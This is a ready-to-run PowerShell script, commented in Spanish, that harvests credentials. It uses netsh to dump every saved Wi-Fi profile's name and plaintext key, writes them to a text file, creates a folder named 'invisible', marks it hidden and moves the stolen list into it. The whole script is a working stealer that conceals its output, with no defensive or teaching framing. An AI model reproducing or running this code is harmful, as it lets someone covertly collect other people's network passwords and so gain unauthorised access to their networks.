# --- Configuración ---
$outputFile = "wpsd.txt"
$outputFolder = "invisible"
# Obtener la ruta del directorio donde se está ejecutando el script
$scriptDirectory = $PSScriptRoot # Variable automática que contiene la ruta del script
$outputFilePath = Join-Path -Path $scriptDirectory -ChildPath $outputFile
$outputFolderPath = Join-Path -Path $scriptDirectory -ChildPath $outputFolder

# --- Limpiar archivo de salida anterior si existe ---
if (Test-Path $outputFilePath) {
    Remove-Item -Path $outputFilePath -Force
}

# --- Obtener perfiles Wi-Fi y contraseñas ---
Write-Host "Recopilando perfiles Wi-Fi y contraseñas..."

# Ejecutar netsh para obtener los perfiles
$profilesOutput = (netsh wlan show profiles)

# Filtrar las líneas que contienen los nombres de perfil (ajustar si el idioma del sistema es diferente)
# Este patrón busca líneas que comiencen con espacios, luego "Perfil de todos los usuarios" o "All User Profile", seguido de ":"
$profileLines = $profilesOutput | Where-Object { $_ -match '^\s*(?:Perfil de todos los usuarios|All User Profile)\s*:\s*(.+)$' }

if (-not $profileLines) {
    Write-Warning "No se encontraron perfiles Wi-Fi guardados."
} else {
    # --- Iterar sobre cada perfil encontrado ---
    foreach ($line in $profileLines) {
        # Extraer el nombre del perfil (la parte después de los dos puntos, eliminando espacios)
        $profileName = ($line -split ':', 2)[1].Trim()

        # Inicializar la contraseña por si no se encuentra
        $password = "[No encontrada o no aplicable]"

        # Obtener los detalles del perfil, incluyendo la clave en texto claro
        try {
            $profileDetailOutput = (netsh wlan show profile name="$profileName" key=clear)

            # Buscar la línea que contiene la contraseña (ajustar si el idioma del sistema es diferente)
            # Este patrón busca líneas que comiencen con espacios, luego "Contenido de la clave" o "Key Content", seguido de ":"
            $keyLine = $profileDetailOutput | Where-Object { $_ -match '^\s*(?:Contenido de la clave|Key Content)\s*:\s*(.+)$' }

            if ($keyLine) {
                # Extraer la contraseña (la parte después de los dos puntos, eliminando espacios)
                $password = ($keyLine -split ':', 2)[1].Trim()
            } else {
                Write-Host "Advertencia: No se encontró contraseña para el perfil '$profileName' (puede ser una red abierta o empresarial)."
            }
        } catch {
            Write-Warning "Error al obtener detalles para el perfil '$profileName': $($_.Exception.Message)"
            # Continuar con el siguiente perfil en caso de error
            continue
        }

        # --- Añadir la información al archivo de salida ---
        Add-Content -Path $outputFilePath -Value "SSID: $profileName"
        Add-Content -Path $outputFilePath -Value "PWD: $password"
        Add-Content -Path $outputFilePath -Value "-----------------------------------------"

        Write-Host "Perfil procesado: $profileName"
    }
}

# --- Crear carpeta oculta ---
Write-Host "Creando carpeta oculta '$outputFolder'..."
try {
    # Crear el directorio si no existe
    if (-not (Test-Path -Path $outputFolderPath -PathType Container)) {
        New-Item -Path $outputFolderPath -ItemType Directory -Force -ErrorAction Stop | Out-Null
    }
    # Obtener el objeto de la carpeta y establecer el atributo oculto
    $folderItem = Get-Item -Path $outputFolderPath -Force # -Force para obtenerla incluso si ya está oculta
    # Asegurarse de que el atributo Hidden esté presente
    if (($folderItem.Attributes -band [System.IO.FileAttributes]::Hidden) -ne [System.IO.FileAttributes]::Hidden) {
         $folderItem.Attributes = $folderItem.Attributes -bor [System.IO.FileAttributes]::Hidden
    }
    Write-Host "Carpeta '$outputFolder' creada y/o asegurada como oculta."
} catch {
    Write-Error "Error al crear o establecer como oculta la carpeta '$outputFolder': $($_.Exception.Message)"
    # Considerar si salir o continuar dependiendo de la criticidad
    # exit 1
}

# --- Mover el archivo de salida a la carpeta oculta ---
if (Test-Path $outputFilePath) {
    Write-Host "Moviendo '$outputFile' a '$outputFolder'..."
    try {
        Move-Item -Path $outputFilePath -Destination $outputFolderPath -Force -ErrorAction Stop
        Write-Host "Archivo '$outputFile' movido a la carpeta oculta '$outputFolder'."
    } catch {
         Write-Error "Error al mover '$outputFile' a '$outputFolder': $($_.Exception.Message)"
    }
} else {
    # Esto podría pasar si no se encontraron perfiles o hubo errores al escribir el archivo
    Write-Warning "El archivo '$outputFile' no fue encontrado en '$scriptDirectory', no se moverá."
}

Write-Host "Script de PowerShell completado."

# No se necesita un 'exit' explícito como en Batch, el script termina aquí.
# Si necesitas devolver un código de salida específico, puedes usar 'exit $codigo'
